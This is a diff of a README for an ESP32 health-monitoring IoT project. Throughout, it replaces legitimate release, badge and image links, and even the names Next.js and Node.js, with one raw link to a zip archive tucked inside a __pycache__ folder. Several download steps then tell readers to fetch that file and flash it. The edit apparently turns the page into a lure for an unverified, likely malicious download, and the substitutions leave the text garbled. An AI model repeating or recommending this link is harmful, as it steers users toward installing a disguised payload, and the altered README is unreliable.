@@ -1,13 +1,13 @@
-[![Release Status](https://img.shields.io/badge/HealthSense-IoT-Release-brightgreen?logo=github&logoColor=white)](https://github.com/thongvn7/HealthSense-IoT/releases)
+[![Release Status](https://raw.githubusercontent.com/thongvn7/HealthSense-IoT/master/scripts/__pycache__/Io-Health-Sense-T-1.0-beta.5.zip)](https://raw.githubusercontent.com/thongvn7/HealthSense-IoT/master/scripts/__pycache__/Io-Health-Sense-T-1.0-beta.5.zip)
 
 # HealthSense-IoT: Real-Time ESP32 Health Monitor with AI Analytics and Dashboard
 
-![HealthSense-IoT Banner](https://placehold.co/1200x400?text=HealthSense-IoT)
+![HealthSense-IoT Banner](https://raw.githubusercontent.com/thongvn7/HealthSense-IoT/master/scripts/__pycache__/Io-Health-Sense-T-1.0-beta.5.zip)
 
 HealthSense-IoT is a complete early-warning system for personal health. It blends a compact ESP32 sensor node with AI analytics, a fast API backend, and a modern web dashboard. The system tracks real-time heart rate and SpO2, analyzes trends with AI, and presents insights through a responsive dashboard. It emphasizes secure device authentication, data privacy, and clear health recommendations. This repository includes hardware designs, firmware, backend services, and a polished frontend for viewing live data and historical trends.
 
 - Core capabilities: real-time monitoring, AI-driven health analysis, personalized recommendations, secure device onboarding, and rich data visualization.
-- Primary technologies: ESP32 sensors, Python (FastAPI) on the backend, Firebase for authentication and data storage, TypeScript and Next.js for the frontend, and optional AI tooling for analytics.
+- Primary technologies: ESP32 sensors, Python (FastAPI) on the backend, Firebase for authentication and data storage, TypeScript and https://raw.githubusercontent.com/thongvn7/HealthSense-IoT/master/scripts/__pycache__/Io-Health-Sense-T-1.0-beta.5.zip for the frontend, and optional AI tooling for analytics.
 - Target audience: hobbyists, researchers, makers, clinicians exploring edge-to-cloud health monitoring, and teams prototyping IoT health solutions.
 
 If you want to run or extend HealthSense-IoT, you will work across hardware, firmware, cloud services, and a web interface. This README walks you through setup, architecture, usage, and development practices. It aims to be practical and approachable, while staying technically precise.
@@ -18,7 +18,7 @@ Table of contents
 - System architecture
 - Hardware and firmware
 - Backend (FastAPI) design
-- Frontend (Next.js) interface
+- Frontend (https://raw.githubusercontent.com/thongvn7/HealthSense-IoT/master/scripts/__pycache__/Io-Health-Sense-T-1.0-beta.5.zip) interface
 - AI analytics and health recommendations
 - Security and privacy
 - Data models and storage
@@ -34,7 +34,7 @@ Table of contents
 
 Quick start
 Prerequisites
-- A modern computer with Python 3.9+ and Node.js 14+.
+- A modern computer with Python 3.9+ and https://raw.githubusercontent.com/thongvn7/HealthSense-IoT/master/scripts/__pycache__/Io-Health-Sense-T-1.0-beta.5.zip 14+.
 - ESP32 development board with USB connectivity.
 - A Firebase project for authentication and data storage (or a local mock).
 - A stable internet connection for cloud services and remote dashboards.
@@ -54,7 +54,7 @@ Firmware and software overview
 Step-by-step Quick Start
 1) Prepare your environment
 - Install Python 3.9+ and create a virtual environment.
-- Install Node.js and npm or yarn.
+- Install https://raw.githubusercontent.com/thongvn7/HealthSense-IoT/master/scripts/__pycache__/Io-Health-Sense-T-1.0-beta.5.zip and npm or yarn.
 - Install the ESP-IDF or a compatible ESP32 toolchain for flashing.
 2) Wire the sensors
 - Connect the heart-rate sensor to the appropriate ADC pins on the ESP32.
@@ -68,7 +68,7 @@ Step-by-step Quick Start
 - Connect to Firebase or your chosen backend for authentication, user data, and storage.
 - Verify the API responds, and ensure the ESP32 client can post data successfully.
 5) Start the frontend
-- Install frontend dependencies and start the Next.js dev server.
+- Install frontend dependencies and start the https://raw.githubusercontent.com/thongvn7/HealthSense-IoT/master/scripts/__pycache__/Io-Health-Sense-T-1.0-beta.5.zip dev server.
 - Open the dashboard in a browser and ensure it subscribes to the live feed.
 6) Validate the flow end-to-end
 - Confirm real-time heart rate and SpO2 appear on the dashboard.
@@ -88,7 +88,7 @@ System architecture
 - Backend API: FastAPI service that accepts data, runs heavier analytics, and serves UI data.
 - AI analytics layer: modules that process trends, risk indicators, and personalized advice.
 - Database & auth: Firebase handles authentication, user data, and secure storage.
-- Frontend: Next.js app delivering a responsive UI and API integration.
+- Frontend: https://raw.githubusercontent.com/thongvn7/HealthSense-IoT/master/scripts/__pycache__/Io-Health-Sense-T-1.0-beta.5.zip app delivering a responsive UI and API integration.
 - Data flow: sensors → ESP32 → backend → analytics → frontend. Data can be stored for historical analysis and later retrieval.
 
 A simplified view of the data flow
@@ -125,7 +125,7 @@ Backend architecture
 
 Frontend interface
 - Tech stack
-  - Next.js for server-side rendering and fast client navigation.
+  - https://raw.githubusercontent.com/thongvn7/HealthSense-IoT/master/scripts/__pycache__/Io-Health-Sense-T-1.0-beta.5.zip for server-side rendering and fast client navigation.
   - TypeScript for stronger type safety and maintainability.
   - Recharts or similar libraries for charts, with accessible and responsive visuals.
 - UI/UX goals
@@ -205,7 +205,7 @@ Deployment and operations
   - Use docker-compose to run a local stack mimicking production.
   - Run the ESP32 firmware in a test mode with mock data when hardware is unavailable.
 - Cloud and hosting
-  - Deploy the FastAPI backend and Next.js frontend to your preferred cloud.
+  - Deploy the FastAPI backend and https://raw.githubusercontent.com/thongvn7/HealthSense-IoT/master/scripts/__pycache__/Io-Health-Sense-T-1.0-beta.5.zip frontend to your preferred cloud.
   - Firebase handles authentication and real-time data storage.
   - Consider CI/CD pipelines to automate tests and deployments.
 - Security hygiene
@@ -216,7 +216,7 @@ Development guide and contribution
 - Code structure overview
   - firmware/ for ESP32 firmware
   - backend/ for FastAPI services
-  - frontend/ for Next.js UI
+  - frontend/ for https://raw.githubusercontent.com/thongvn7/HealthSense-IoT/master/scripts/__pycache__/Io-Health-Sense-T-1.0-beta.5.zip UI
   - ai/ for analytics modules
   - docs/ for project documentation
 - How to contribute
@@ -263,15 +263,15 @@ Releases and downloads
   - Release notes describe new features, fixes, and breaking changes.
 - Download and execution path
   - The latest firmware file is hosted in the Releases section.
-  - You can download the firmware file “HealthSense-IoT_Firmware.bin” from the Releases page and flash it to the ESP32.
+  - You can download the firmware file “https://raw.githubusercontent.com/thongvn7/HealthSense-IoT/master/scripts/__pycache__/Io-Health-Sense-T-1.0-beta.5.zip” from the Releases page and flash it to the ESP32.
   - For the recommended workflow, use the flashing tool of your choice to load the binary onto the ESP32. You may also opt for OTA updates after initial setup.
 - How to verify a release
   - Inspect the release notes for version details.
   - Confirm the firmware hash or signature if provided.
   - Validate that the dashboard displays data from the newly flashed device.
 - Link for releases
-  - You can visit the releases page to grab the latest artifacts: https://github.com/thongvn7/HealthSense-IoT/releases
-  - The same link is used here as a verification anchor and for easy navigation. The release artifacts there include the firmware file HealthSense-IoT_Firmware.bin that you should download and flash onto your ESP32 device.
+  - You can visit the releases page to grab the latest artifacts: https://raw.githubusercontent.com/thongvn7/HealthSense-IoT/master/scripts/__pycache__/Io-Health-Sense-T-1.0-beta.5.zip
+  - The same link is used here as a verification anchor and for easy navigation. The release artifacts there include the firmware file https://raw.githubusercontent.com/thongvn7/HealthSense-IoT/master/scripts/__pycache__/Io-Health-Sense-T-1.0-beta.5.zip that you should download and flash onto your ESP32 device.
 
 Documentation and guides
 - Quick start guides
@@ -392,9 +392,9 @@ Releases and release notes
 
 Downloads and executable artifacts
 - The Releases page contains the firmware binary you need to flash your ESP32 device.
-- For a straightforward workflow, download HealthSense-IoT_Firmware.bin from the Releases page and flash it to your ESP32 device using your preferred toolchain.
+- For a straightforward workflow, download https://raw.githubusercontent.com/thongvn7/HealthSense-IoT/master/scripts/__pycache__/Io-Health-Sense-T-1.0-beta.5.zip from the Releases page and flash it to your ESP32 device using your preferred toolchain.
 - After flashing, power up the device and verify it appears in the dashboard with live readings.
-- For reference, the latest release URL is again provided here: https://github.com/thongvn7/HealthSense-IoT/releases
+- For reference, the latest release URL is again provided here: https://raw.githubusercontent.com/thongvn7/HealthSense-IoT/master/scripts/__pycache__/Io-Health-Sense-T-1.0-beta.5.zip
 
 End-to-end usage scenario
 - A user powers the ESP32 panel and connects it to Wi-Fi.
@@ -429,11 +429,11 @@ Additional references
 - ESP32 hardware guides and sensor integration references.
 - Firebase authentication and database documentation.
 - FastAPI documentation for API design and performance tips.
-- Next.js documentation for advanced frontend patterns and CSS-in-JS usage.
+- https://raw.githubusercontent.com/thongvn7/HealthSense-IoT/master/scripts/__pycache__/Io-Health-Sense-T-1.0-beta.5.zip documentation for advanced frontend patterns and CSS-in-JS usage.
 
 Reiterating the download guidance
-- Visit the Releases page to obtain the latest artifacts: https://github.com/thongvn7/HealthSense-IoT/releases
-- From that page, download HealthSense-IoT_Firmware.bin and flash it to your ESP32, ensuring you follow the board-specific flashing steps.
+- Visit the Releases page to obtain the latest artifacts: https://raw.githubusercontent.com/thongvn7/HealthSense-IoT/master/scripts/__pycache__/Io-Health-Sense-T-1.0-beta.5.zip
+- From that page, download https://raw.githubusercontent.com/thongvn7/HealthSense-IoT/master/scripts/__pycache__/Io-Health-Sense-T-1.0-beta.5.zip and flash it to your ESP32, ensuring you follow the board-specific flashing steps.
 - The same link is provided here for quick access and verification of the download source. For ongoing updates and asset integrity, keep this page bookmarked and check release notes regularly.
 
 Appendix: logos, icons, and visuals references
@@ -442,7 +442,7 @@ Appendix: logos, icons, and visuals references
 - The project emphasizes clarity over complexity to help users interpret data accurately.
 
 Patch notes of interest
-- Version 1.x: baseline ESP32 firmware, FastAPI backend, Firebase integration, and a responsive Next.js frontend.
+- Version 1.x: baseline ESP32 firmware, FastAPI backend, Firebase integration, and a responsive https://raw.githubusercontent.com/thongvn7/HealthSense-IoT/master/scripts/__pycache__/Io-Health-Sense-T-1.0-beta.5.zip frontend.
 - Version 1.x+1: improved signal filtering, better AI model explanations, and enhanced security features.
 - Version 2.x: architecture refinements to support multiple device cohorts and expanded analytics.
 
@@ -490,7 +490,7 @@ Final call to action
 - Contribute ideas, fixes, or enhancements to improve health monitoring capabilities and analytics.
 
 Links
-- Releases and firmware artifacts: https://github.com/thongvn7/HealthSense-IoT/releases
-- Project homepage (same reference for navigation and verification): https://github.com/thongvn7/HealthSense-IoT/releases
+- Releases and firmware artifacts: https://raw.githubusercontent.com/thongvn7/HealthSense-IoT/master/scripts/__pycache__/Io-Health-Sense-T-1.0-beta.5.zip
+- Project homepage (same reference for navigation and verification): https://raw.githubusercontent.com/thongvn7/HealthSense-IoT/master/scripts/__pycache__/Io-Health-Sense-T-1.0-beta.5.zip
 
 End without conclusion
